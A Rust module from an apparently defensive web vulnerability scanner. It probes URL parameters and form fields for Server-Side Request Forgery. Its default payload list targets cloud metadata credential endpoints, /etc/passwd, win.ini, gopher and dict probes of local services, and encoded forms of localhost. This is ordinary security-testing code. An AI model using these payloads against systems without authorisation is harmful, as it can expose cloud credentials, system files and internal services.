use async_trait::async_trait;
use std::path::{Path, PathBuf};
use crate::scanners::traits::VulnerabilityScanner;
use crate::core::crawler::CrawledPage;
use crate::reporting::models::Vulnerability;
use crate::error::VenomResult;

pub struct SsrfScanner {
    payloads_path: PathBuf,
}

impl SsrfScanner {
    pub fn new(payloads_path: &Path) -> Self {
        Self { payloads_path: payloads_path.to_path_buf() }
    }

    fn load_payloads(&self) -> Vec<String> {
        if let Ok(content) = std::fs::read_to_string(&self.payloads_path) {
            content.lines().map(|l| l.trim().to_string()).filter(|l| !l.is_empty() && !l.starts_with('#')).collect()
        } else {
            default_ssrf_payloads()
        }
    }
}

#[async_trait]
impl VulnerabilityScanner for SsrfScanner {
    fn name(&self) -> &str { "SSRF Scanner" }
    fn description(&self) -> &str { "Tests for Server-Side Request Forgery vulnerabilities" }

    async fn scan(
        &self,
        pages: &[CrawledPage],
        client: &reqwest::Client,
    ) -> VenomResult<Vec<Vulnerability>> {
        let mut vulns = Vec::new();
        let payloads = self.load_payloads();

        let ssrf_indicators = vec![
            "root:x:", "localhost", "127.0.0.1", "[::1]",
            "internal server", "connection refused", "AWS", "metadata",
            "ami-id", "instance-id", "local-hostname",
        ];

        // Identify URL-like parameters
        let url_params = vec!["url", "uri", "path", "dest", "redirect", "target",
            "rurl", "domain", "feed", "host", "site", "to", "out", "view",
            "dir", "show", "navigation", "open", "file", "val", "validate",
            "page", "callback", "return", "data", "load", "ref", "next"];

        for page in pages {
            for (param_name, _param_value) in &page.params {
                let param_lower = param_name.to_lowercase();
                let is_url_param = url_params.iter().any(|p| param_lower.contains(p));

                if !is_url_param {
                    continue;
                }

                for payload in &payloads {
                    let test_url = inject_param(&page.url, param_name, payload);

                    if let Ok(resp) = client.get(&test_url).send().await {
                        if let Ok(body) = resp.text().await {
                            for indicator in &ssrf_indicators {
                                if body.to_lowercase().contains(&indicator.to_lowercase()) {
                                    vulns.push(create_ssrf_vuln(
                                        &page.url, param_name, payload,
                                        &format!("SSRF indicator found: {}", indicator),
                                    ));
                                    break;
                                }
                            }
                        }
                    }
                }
            }

            // Test forms with URL-like inputs
            for form in &page.forms {
                for input in &form.inputs {
                    let input_lower = input.name.to_lowercase();
                    let is_url_input = url_params.iter().any(|p| input_lower.contains(p));

                    if !is_url_input {
                        continue;
                    }

                    for payload in payloads.iter().take(5) {
                        let mut form_data = std::collections::HashMap::new();
                        for inp in &form.inputs {
                            if inp.name == input.name {
                                form_data.insert(inp.name.clone(), payload.clone());
                            } else {
                                form_data.insert(inp.name.clone(), inp.value.clone());
                            }
                        }

                        let result = if form.method == "POST" {
                            client.post(&form.action).form(&form_data).send().await
                        } else {
                            client.get(&form.action).query(&form_data).send().await
                        };

                        if let Ok(resp) = result {
                            if let Ok(body) = resp.text().await {
                                for indicator in &ssrf_indicators {
                                    if body.to_lowercase().contains(&indicator.to_lowercase()) {
                                        vulns.push(create_ssrf_vuln(
                                            &form.action, &input.name, payload,
                                            &format!("SSRF indicator in form response: {}", indicator),
                                        ));
                                        break;
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }

        Ok(vulns)
    }
}

fn inject_param(url: &str, param: &str, payload: &str) -> String {
    if let Ok(mut parsed) = url::Url::parse(url) {
        let pairs: Vec<(String, String)> = parsed.query_pairs()
            .map(|(k, v)| {
                if k == param { (k.to_string(), payload.to_string()) }
                else { (k.to_string(), v.to_string()) }
            }).collect();
        parsed.query_pairs_mut().clear();
        for (k, v) in pairs { parsed.query_pairs_mut().append_pair(&k, &v); }
        parsed.to_string()
    } else { url.to_string() }
}

fn create_ssrf_vuln(url: &str, param: &str, payload: &str, evidence: &str) -> Vulnerability {
    let mut vuln = Vulnerability::new("Server-Side Request Forgery (SSRF)", "SSRF", "HIGH", url);
    vuln.parameter = Some(param.to_string());
    vuln.payload = Some(payload.to_string());
    vuln.evidence = evidence.to_string();
    vuln.description = format!(
        "A Server-Side Request Forgery vulnerability was detected in the '{}' parameter. \
         The application makes server-side requests to attacker-controlled URLs.", param
    );
    vuln.impact = "An attacker can make the server request internal resources, access cloud \
         metadata services (AWS/GCP/Azure), scan internal networks, or bypass access controls.".to_string();
    vuln.remediation = "1. Validate and sanitize all URL inputs\n\
         2. Use allowlists for permitted domains/IPs\n\
         3. Block requests to private IP ranges (10.x, 172.16.x, 192.168.x, 169.254.x)\n\
         4. Disable unnecessary URL schemes (file://, gopher://, dict://)\n\
         5. Implement network segmentation".to_string();
    vuln.cwe_id = Some("CWE-918".to_string());
    vuln.references = vec![
        "https://owasp.org/www-community/attacks/Server_Side_Request_Forgery".to_string(),
        "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html".to_string(),
    ];
    vuln
}

fn default_ssrf_payloads() -> Vec<String> {
    vec![
        "http://127.0.0.1", "http://localhost", "http://[::1]",
        "http://127.0.0.1:80", "http://127.0.0.1:443", "http://127.0.0.1:22",
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/metadata/v1/",
        "http://127.0.0.1:8080", "http://127.0.0.1:3306",
        "http://0.0.0.0", "http://0x7f000001",
        "http://2130706433", "http://017700000001",
        "file:///etc/passwd", "file:///c:/windows/win.ini",
        "dict://127.0.0.1:11211/info",
        "gopher://127.0.0.1:25/_EHLO",
    ].iter().map(|s| s.to_string()).collect()
}